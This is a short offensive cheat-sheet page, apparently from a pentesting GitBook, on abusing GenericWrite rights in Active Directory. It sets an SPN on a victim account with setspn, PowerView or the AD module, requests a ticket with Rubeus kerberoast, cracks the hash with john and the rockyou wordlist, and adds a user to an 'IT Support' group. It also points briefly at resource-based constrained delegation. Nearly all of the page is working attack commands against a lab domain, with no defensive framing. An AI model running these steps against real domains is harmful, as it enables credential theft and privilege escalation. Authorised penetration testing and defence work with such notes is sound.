---
metaLinks:
  alternates:
    - >-
      https://app.gitbook.com/s/qDX4NWkPelZggTpGCfyF/offensive-treasure/ad-attack/abuse-acls/genericwrite
---

# GenericWrite

## GenericWrite

### User

```powershell
# Setspn
C:\Tools>setspn -S 'http/dc01' vulnableone.local\testservice3
Checking domain DC=vulnableone,DC=local

Registering ServicePrincipalNames for CN=TestService3,OU=prodUsers,DC=vulnableone, DC=local
        'http/dc01'
Updated object

# PowerView
Set-DomainObject -Identity khan.chanthou -Set @{serviceprincipalname='vulnableone/myspn1433'} -verbose

# AD-Module
Set-ADUser -Identity khan.chanthou -ServicePrincipalNames @{Add='vulnableone/myspn1433'} 
```

Request for ticket

```powershell
Rubeus.exe kerberoast /user:testservice3 /nowrap
```

Crack hash

```
john --format=krb5tgs --wordlist=/usr/share/wordlists/rockyou.txt spn.txt
```

### Group

Add Member

{% code title="AD-Module" %}
```powershell
PS C:\> Add-ADGroupMember "IT Support" -Members "khan.chhanthou"
```
{% endcode %}

We can verify that the command worked by using the Get-ADGroupMember cmdlet:

{% code title="AD-Module" %}
```powershell
PS C:\>Get-ADGroupMember -Identity "IT Support"
distinguishedName : CN=khan.chanthou,OU=People,DC=vulnableone,DC=local
name              : khan.chanthou
objectClass       : user
objectGUID        : 460178d3-c818-4e28-9a39-b1af2b0d3779
SamAccountName    : khan.chanthou
SID               : S-1-5-21-3885271727-2693558621-2658995185-1113
```
{% endcode %}

### Computer

We can enumerate and attempted for Resourced Based Constrained Delegation.
